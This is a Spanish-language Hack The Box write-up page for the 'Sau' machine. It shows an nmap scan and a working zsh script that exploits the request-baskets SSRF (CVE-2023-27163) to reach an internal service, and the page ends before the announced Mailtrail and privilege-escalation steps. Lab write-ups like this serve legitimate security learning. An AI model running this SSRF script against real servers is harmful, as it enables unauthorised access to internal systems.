<!DOCTYPE html><html lang="en" class="scroll-smooth" data-astro-cid-37fxchfa> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/ico" href="/favicon.ico"><meta name="generator" content="Astro v4.0.8"><!-- Canonical URL --><link rel="canonical" href="https://blog-template-gray.vercel.app/post/sau/"><!-- Primary Meta Tags --><title>Sau - HTB Writeup - Fullaw4ke Blog</title><!-- ViewTransitions  --><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><!-- SEO --><meta name="title" content="Sau - HTB Writeup - Fullaw4ke Blog"><meta name="description" content="Abusamos del CVE-2023-27163 para conseguir una shell, luego CVE-2023-26604 para la Escalada de Privilegios."><meta name="author" content="Fullaw4ke"><!-- Open Graph / Facebook --><meta property="og:type" content="article"><meta property="og:url" content="https://blog-template-gray.vercel.app/post/sau/"><meta property="og:title" content="Sau - HTB Writeup"><meta property="og:description" content="Abusamos del CVE-2023-27163 para conseguir una shell, luego CVE-2023-26604 para la Escalada de Privilegios."><meta property="og:image" content="https://blog-template-gray.vercel.app/_astro/1.uzWGtu3S.png"><meta property="article:author" content="Fullaw4ke"><meta property="article:published_time" content="2022-07-02T04:00:00.000Z"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog-template-gray.vercel.app/post/sau/"><meta property="twitter:title" content="Sau - HTB Writeup"><meta property="twitter:description" content="Abusamos del CVE-2023-27163 para conseguir una shell, luego CVE-2023-26604 para la Escalada de Privilegios."><meta property="twitter:image" content="https://blog-template-gray.vercel.app/_astro/1.uzWGtu3S.png"><!-- RSS auto-discovery --><link rel="alternate" type="application/rss+xml" title="Fullaw4ke Blog" href="/rss.xml"><link as="font" crossorigin rel="preload" href="/fonts/Manrope-Bold.woff2" type="font/woff2"><style>@font-face {font-weight: 200;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraLight.woff2)}</style><style>@font-face {font-weight: 300;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Light.woff2)}</style><style>@font-face {font-weight: 400;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Regular.woff2)}</style><style>@font-face {font-weight: 500;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Medium.woff2)}</style><style>@font-face {font-weight: 600;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-SemiBold.woff2)}</style><style>@font-face {font-weight: 700;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-Bold.woff2)}</style><style>@font-face {font-weight: 800;font-style: normal;font-family: Manrope;font-display: swap;src: url(/fonts/Manrope-ExtraBold.woff2)}</style><style>@font-face { font-family: _font_fallback_1728655860601; size-adjust: 103.76%; src: local('Arial'); ascent-override: 102.74%; descent-override: 28.91%; line-gap-override: 0.00%; }</style><script>
	function getTheme() {
		const storedTheme = typeof localStorage !== 'undefined' && localStorage.getItem('theme')

		return (
			storedTheme || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'light' : 'dark')
		)
	}

	function setTheme(newTheme) {
		const html = document.documentElement
		const isDark = newTheme === 'dark'

		html.classList.toggle('dark', isDark)
		html.classList.toggle('light', !isDark)

		localStorage.setItem('theme', newTheme)
	}

	// set initial theme
	setTheme(getTheme())
	document.addEventListener('astro:after-swap', () => setTheme(getTheme()))

	document.addEventListener('theme-change', (e) => {
		setTheme(e.detail.theme)
	})
</script><script>
	if (!('animations' in localStorage)) {
		localStorage.setItem('animations', 'true')
	} else {
		localStorage.setItem('animations', 'false')
	}
</script><link rel="stylesheet" href="/_astro/_page_.oLAkEadO.css" />
<link rel="stylesheet" href="/_astro/_slug_.m5WJ7WE5.css" /><script type="module" src="/_astro/hoisted.cZ5bdfWX.js"></script></head> <body class="bg-white text-stone-950 dark:bg-[#0a0910] dark:text-white" data-astro-cid-37fxchfa> <main class="px-5 sm:mx-auto sm:max-w-2xl sm:px-8 lg:px-0 antialiased md:max-w-6xl grid gap-12 mt-4 overflow-hidden md:overflow-visible" data-astro-cid-37fxchfa> <header class="relative flex items-center h-12 font-semibold"> <a class="text-lg mr-auto" href="/">Home</a> <div id="astro-header-drawer" class="shadow rounded-l-lg md:bg-transparent dark:md:bg-transparent bg-white dark:bg-[#0a0910] md:shadow-none md:rounded-none md:border-none md:h-auto md:static absolute transition-transform duration-300 ease-in translate-x-96 md:translate-x-0 top-12 -right-5 pl-4 pt-6 pb-4 md:p-0 h-[200px] w-[200px] z-50"> <nav class="flex h-full flex-col justify-between gap-12 text-left md:flex-row md:w-full md:gap-5"> <div class="flex flex-col gap-4 md:flex-row md:border-r-2 border-black pr-4 dark:border-white"> <a href="/tags" class="text-opacity-60 flex items-center gap-1 text-2xl md:text-base" rel="noopener noreferrer ">  <svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M7.859 6h-2.834a2.025 2.025 0 0 0 -2.025 2.025v2.834c0 .537 .213 1.052 .593 1.432l6.116 6.116a2.025 2.025 0 0 0 2.864 0l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-6.117 -6.116a2.025 2.025 0 0 0 -1.431 -.593z"></path> <path d="M17.573 18.407l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-7.117 -7.116"></path> <path d="M6 9h-.01"></path> </svg> Tags
 </a> </div> <div class="flex justify-center items-center md:justify-end gap-3 md:p-0"> <a href="https://github.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Github">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path> </svg> </span>  </a><a href="https://x.com/fullaw4ke" class="text-opacity-60" rel="noopener noreferrer " target="_blank" aria-label="Twitter">  <span><svg xmlns="http://www.w3.org/2000/svg" class="w-8 md:w-6" viewBox="0 0 24 24" stroke-width="1.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c0 -.249 1.51 -2.772 1.818 -4.013z"></path> </svg> </span>  </a> </div> </nav> </div> <div class="flex items-center gap-3 md:pl-3" data-astro-transition-persist="navbar"> <div> <site-search id="search" class="ms-auto"> <button data-open-modal disabled class="flex items-center justify-center rounded-md gap-1"> <svg aria-label="search" class="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"> <path stroke="none" d="M0 0h24v24H0z"></path> <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path> </svg> <!-- <span class='md:hidden text-2xl'> Search</span> --> </button> <dialog aria-label="search" class="h-full max-h-full w-full max-w-full border border-zinc-400 bg-white dark:bg-[#0a0910ec] shadow backdrop:backdrop-blur sm:mx-auto sm:mb-auto sm:mt-16 sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md opacity-0"> <div class="dialog-frame flex flex-col gap-4 p-6 pt-12 sm:pt-6"> <button data-close-modal class="ms-auto cursor-pointer rounded-full bg-black text-white px-4 py-2 dark:bg-white dark:text-black">Close</button> <div class="search-container dark:text-white"> <div id="pagefind__search"></div> </div> </div> </dialog> </site-search>   </div>  <theme-toggle class="relative h-6 w-6"> <button id="toggle-theme" class="group" aria-label="Toggle Theme"> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-pressed:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun-high" width="24" height="24" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M14.828 14.828a4 4 0 1 0 -5.656 -5.656a4 4 0 0 0 5.656 5.656z"></path> <path d="M6.343 17.657l-1.414 1.414"></path> <path d="M6.343 6.343l-1.414 -1.414"></path> <path d="M17.657 6.343l1.414 -1.414"></path> <path d="M17.657 17.657l1.414 1.414"></path> <path d="M4 12h-2"></path> <path d="M12 4v-2"></path> <path d="M20 12h2"></path> <path d="M12 20v2"></path> </svg> </span> <span class="absolute left-0 right-0 top-0 opacity-0 group-aria-[pressed=false]:opacity-100"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> </svg> </span> </button> </theme-toggle> <script>
	const button = document.getElementById('toggle-theme')

	function setButtonPresssed() {
		const bodyThemeIsDark = document.documentElement.classList.contains('dark')
		button.setAttribute('aria-pressed', String(bodyThemeIsDark))
	}
	setButtonPresssed()
</script> <button id="astro-header-drawer-button" type="button" class="md:ml-6 md:hidden"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.25" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M4 6l16 0"></path> <path d="M4 12l16 0"></path> <path d="M4 18l16 0"></path> </svg> <span class="sr-only">Show Menu</span> </button> </div> </header>   <article class="min-w-full md:py-4 sm:max-w-none md:max-w-none"> <header class="mb-3 flex flex-col justify-center items-center gap-6"> <div class="flex flex-col gap-2"> <div class="flex items-center justify-center gap-x-1"> <p class="text-center text-sm text-opacity-50">
Published <time class="text-sm font-bold text-opacity-60" datetime="2022-07-02T04:00:00.000Z"> Jul 2, 2022 </time> </p> <p class="text-center text-sm text-opacity-50 font-bold">
- 5 min read </p> </div> <h1 class="text-center text-4xl md:text-6xl md:pb-2.5 font-semibold"> Sau - HTB Writeup </h1> </div> <div class="flex flex-wrap justify-center items-center gap-2 gap-y-4 md:gap-5"> <a href="/tags/easy" aria-label="Easy"> <span class="bg-indigo-600 font-semibold text-white dark:bg-indigo-900 dark:text-white shadow text-sm w-fit px-2 py-1 md:px-5 md:py-2 rounded-full"> Easy </span> </a> </div> </header> <img src="/_astro/1.uzWGtu3S_Z1zpF6e.jpg" loading="eager" class="rounded-md w-full max-h-[300px]  md:max-h-[500px] my-8 object-cover" alt="img of Sau - HTB Writeup" width="1000" height="500" decoding="async"> <hr> <div>  <div class="grid grid-cols-1 md:grid-cols-[20%_auto] gap-10 mt-8"> <!-- aside  --> <aside class="md:flex flex-col gap-8 hidden"> <div class="flex flex-col gap-2"> <span class="mb-1 font-bold text-2xl">Share</span> <ul class="flex gap-3 text-black dark:text-white"> <li> <a href="https://twitter.com/intent/tweet?text=Share this post https://blog-template-gray.vercel.app/post/sau/" aria-label="Share on Twitter"><!--?xml version="1.0" ?--><svg height="32px" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:2;" version="1.1" viewBox="0 0 512 512" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M448,512l-384,0c-35.328,0 -64,-28.672 -64,-64l0,-384c0,-35.328 28.672,-64 64,-64l384,0c35.328,0 64,28.672 64,64l0,384c0,35.328 -28.672,64 -64,64Z" id="Dark_Blue" style="fill:#1da1f2;fill-rule:nonzero;"></path><path d="M196.608,386.048c120.704,0 186.752,-100.096 186.752,-186.752c0,-2.816 0,-5.632 -0.128,-8.448c12.8,-9.216 23.936,-20.864 32.768,-34.048c-11.776,5.248 -24.448,8.704 -37.76,10.368c13.568,-8.064 23.936,-20.992 28.928,-36.352c-12.672,7.552 -26.752,12.928 -41.728,15.872c-12.032,-12.8 -29.056,-20.736 -47.872,-20.736c-36.224,0 -65.664,29.44 -65.664,65.664c0,5.12 0.64,10.112 1.664,14.976c-54.528,-2.688 -102.912,-28.928 -135.296,-68.608c-5.632,9.728 -8.832,20.992 -8.832,33.024c0,22.784 11.648,42.88 29.184,54.656c-10.752,-0.384 -20.864,-3.328 -29.696,-8.192l0,0.896c0,31.744 22.656,58.368 52.608,64.384c-5.504,1.536 -11.264,2.304 -17.28,2.304c-4.224,0 -8.32,-0.384 -12.288,-1.152c8.32,26.112 32.64,45.056 61.312,45.568c-22.528,17.664 -50.816,28.16 -81.536,28.16c-5.248,0 -10.496,-0.256 -15.616,-0.896c28.928,18.432 63.488,29.312 100.48,29.312" id="Logo__x2014__FIXED" style="fill:#fff;fill-rule:nonzero;"></path></g></svg></a> </li> <li> <a href="https://www.linkedin.com/shareArticle?mini=true&#38;url=https://blog-template-gray.vercel.app/post/sau/" aria-label="Share on LinkedIn"> <svg enable-background="new 0 0 32 32" height="32px" id="Layer_1" version="1.0" viewBox="0 0 32 32" width="32px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><path d="M32,30c0,1.104-0.896,2-2,2H2c-1.104,0-2-0.896-2-2V2c0-1.104,0.896-2,2-2h28c1.104,0,2,0.896,2,2V30z" fill="#007BB5"></path><g><rect fill="#FFFFFF" height="14" width="4" x="7" y="11"></rect><path d="M20.499,11c-2.791,0-3.271,1.018-3.499,2v-2h-4v14h4v-8c0-1.297,0.703-2,2-2c1.266,0,2,0.688,2,2v8h4v-7    C25,14,24.479,11,20.499,11z" fill="#FFFFFF"></path><circle cx="9" cy="8" fill="#FFFFFF" r="2"></circle></g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg></a> </li> </ul> </div> <div class="sticky top-24 self-start hidden md:block transition-all duration-200"> <nav class="max-w-xs dark:text-black"> <p class="font-bold mb-3 text-2xl dark:text-white">Index</p> <ul class="[text-wrap:balance] flex flex-col gap-1"> <li class="flex flex-col"> <a href="#initial-recon" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Initial Recon </a>  </li><li class="flex flex-col"> <a href="#web" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Web </a>  </li><li class="flex flex-col"> <a href="#cve-2023-27163" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> CVE-2023-27163 </a>  </li><li class="flex flex-col"> <a href="#mailtrail" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Mailtrail </a>  </li><li class="flex flex-col"> <a href="#privilege-escalation" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> Privilege Escalation </a>  </li><li class="flex flex-col"> <a href="#cve-2023-26604" class="bg-slate-200 dark:bg-slate-800 dark:hover:bg-indigo-400 hover:bg-indigo-300 hover:text-white py-1 px-4 dark:text-white rounded-full mb-2 first-letter:uppercase w-fit line-clamp-2"> CVE-2023-26604 </a>  </li> </ul> </nav> </div> </aside> <!-- post --> <article class="max-w-full w-full"> <div class="prose prose-lg md:prose-xl dark:prose-invert mb-12 min-w-full"> <p>Sau es una sencilla máquina Hack the Box basada en Linux creada por sau123 que involucra explotación web, Falsificación de Peticiones del Lado del Servidor (SSRF), Vulnerabilidades y Exposiciones Comunes (CVEs), y explotación de políticas Sudo. Un escaneo de puertos reveló inicialmente un servidor HTTP vulnerable a un error SSRF rastreado como CVE-2023-27163. La vulnerabilidad fue explotada para contactar con un servidor HTTP interno que ejecutaba una versión obsoleta de Mailtrail propensa a la inyección de comandos shell, que utilizamos para establecer un shell inverso como puma. La política sudo para este usuario nos permitió explotar CVE-2023-26604 y obtener ejecución como root.</p>
<h1 id="initial-recon">Initial Recon</h1>
<p>Comenzamos realizando un escaneo completo de puertos TCP utilizando el comando nmap. Este comando escanea de forma rápida y fiable cualquier puerto TCP relevante en el objetivo.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Run a thorough port scan</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">nmap</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">10.10.11.224</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -vv</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -Pn</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sT</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -sV</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -n</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -p-</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -T4</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --min-rate=1000</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --max-retries=3</span></span></code></pre> 
<p>El escaneo reportó dos puertos abiertos y dos puertos filtrados:</p>
<p>Aquí está la información en formato de tabla:</p>



































<table><thead><tr><th>Port</th><th>Service</th><th>Product</th><th>Version</th></tr></thead><tbody><tr><td>22</td><td>ssh</td><td>OpenSSH</td><td>8.4p1</td></tr><tr><td>80</td><td>HTTP</td><td></td><td></td></tr><tr><td>8338</td><td>HTTP</td><td></td><td></td></tr><tr><td>55555</td><td>HTTP</td><td></td><td></td></tr></tbody></table>
<p>Primero navegamos a <a href="http://10.10.11.224:55555">http://10.10.11.224:55555</a>, que nos redirigió a <a href="http://10.10.11.224:55555/web">http://10.10.11.224:55555/web</a>. En esta página observamos un pie de página que indicaba que el sitio funcionaba con la versión 1.2.1 de request-baskets.</p>
<p>Buscamos CVEs que afectaran a esta instalación y encontramos un fallo SSRF, CVE-2023-27163. La página CVEDetails de este fallo proporcionaba una descripción de la vulnerabilidad junto con un enlace a detalles de explotación adicionales.</p>
<blockquote>
<p>request-baskets hasta v1.2.1 se descubrió que contiene una falsificación de solicitud del lado del servidor (SSRF) a través del componente /api/baskets/. Esta vulnerabilidad permite a los atacantes acceder a recursos de red e información confidencial a través de una solicitud de API manipulada.</p>
</blockquote>
<h1 id="web">Web</h1>
<h2 id="cve-2023-27163">CVE-2023-27163</h2>
<p>Según la breve prueba de concepto a la que se hace referencia en la página dedicada a CVEDetails, debe realizarse una solicitud HTTP POST especial a /api/baskets/ para crear una nueva cesta y establecer una URL de reenvío. Se ha creado un sencillo script de shell para agilizar este proceso.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic">#!/usr/bin/env zsh</span></span>
<span class="line"><span style="color:#999999;--shiki-dark:#89DDFF">[</span><span style="color:#A65E2B;--shiki-dark:#BABED8"> $#</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> -lt</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span><span style="color:#999999;--shiki-dark:#89DDFF"> ]</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#998418;--shiki-dark:#82AAFF"> echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">Usage: ./ssrf-curl &lt;URL&gt; [OPTS ...]</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#999999;--shiki-dark:#89DDFF"> &amp;&amp;</span><span style="color:#998418;--shiki-dark:#82AAFF"> exit</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">echo</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">{&quot;proxy_response&quot;:true,&quot;expand_path&quot;:true}</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">  jq</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -c</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> --arg</span><span style="color:#B56959;--shiki-dark:#C3E88D"> a</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8;font-style:inherit;--shiki-dark-font-style:italic">$1</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &#39;</span><span style="color:#B56959;--shiki-dark:#C3E88D">.forward_url=$a</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&#39;</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span></span>
<span class="line"><span style="color:#998418;--shiki-dark:#82AAFF">  read</span><span style="color:#B56959;--shiki-dark:#C3E88D"> json</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B07D48;--shiki-dark:#BABED8">basket</span><span style="color:#999999;--shiki-dark:#89DDFF">=</span><span style="color:#999999;--shiki-dark:#89DDFF">$(</span><span style="color:#59873A;--shiki-dark:#FFCB6B">openssl</span><span style="color:#B56959;--shiki-dark:#C3E88D"> rand </span><span style="color:#A65E2B;--shiki-dark:#C3E88D">-hex</span><span style="color:#2F798A;--shiki-dark:#F78C6C"> 8</span><span style="color:#999999;--shiki-dark:#89DDFF">)</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -so</span><span style="color:#B56959;--shiki-dark:#C3E88D"> /dev/null</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -d</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#BABED8">$json</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://10.10.11.224:55555/api/baskets/</span><span style="color:#999999;--shiki-dark:#89DDFF">${</span><span style="color:#B56959;--shiki-dark:#BABED8">basket</span><span style="color:#999999;--shiki-dark:#89DDFF">}</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">curl</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -s</span><span style="color:#B5695999;--shiki-dark:#89DDFF"> &quot;</span><span style="color:#B56959;--shiki-dark:#C3E88D">http://10.10.11.224:55555/</span><span style="color:#999999;--shiki-dark:#89DDFF">${</span><span style="color:#B56959;--shiki-dark:#BABED8">basket</span><span style="color:#999999;--shiki-dark:#89DDFF">}</span><span style="color:#B5695999;--shiki-dark:#89DDFF">&quot;</span><span style="color:#999999;--shiki-dark:#89DDFF"> ${</span><span style="color:#AB5959;--shiki-dark:#89DDFF">@:</span><span style="color:#B07D48;--shiki-dark:#BABED8">2</span><span style="color:#999999;--shiki-dark:#89DDFF">}</span></span></code></pre> 
<h2 id="mailtrail">Mailtrail</h2>
<p>Utilizamos este script para acceder indirectamente al servidor HTTP en el puerto 80, ya que no se puede acceder directamente. Se envió una simple petición HTTP GET para verificar la existencia del servidor HTTP y recopilar información.</p>
<pre class="shiki shiki-themes relative bg-neutral-200/30 dark:shadow-2xl code"><button aria-label="copy-button" class="copy-button absolute  z-20 top-2 right-2  rounded-md transition-all ease-in max-w-full max-h-fit dark:text-gray-600 text-gray-400 hover:text-indigo-500 dark:hover:text-indigo-400"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 8m0 2a2 2 0 0 1 2 -2h8a2 2 0 0 1 2 2v8a2 2 0 0 1 -2 2h-8a2 2 0 0 1 -2 -2z"></path> <path d="M16 8v-2a2 2 0 0 0 -2 -2h-8a2 2 0 0 0 -2 2v8a2 2 0 0 0 2 2h2"></path> </svg></button><span class="check-span absolute z-10 top-2 right-2  rounded-md transition-all ease-in opacity-0 text-green-600 dark:text-green-400 max-w-full max-h-fit "><svg class="icon icon-tabler icon-tabler-check" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M5 12l5 5l10 -10"></path> </svg></span><code><span class="line"><span style="color:#A0ADA0;--shiki-dark:#676E95;font-style:inherit;--shiki-dark-font-style:italic"># Test SSRF script</span></span>
<span class="line"><span style="color:#59873A;--shiki-dark:#FFCB6B">zsh</span><span style="color:#B56959;--shiki-dark:#C3E88D"> ssrf.zsh</span><span style="color:#B56959;--shiki-dark:#C3E88D"> http://localhost:80</span><span style="color:#A65E2B;--shiki-dark:#C3E88D"> -i</span><span style="color:#AB5959;--shiki-dark:#89DDFF"> |</span><span style="color:#59873A;--shiki-dark:#FFCB6B"> more</span></span></code></pre> 
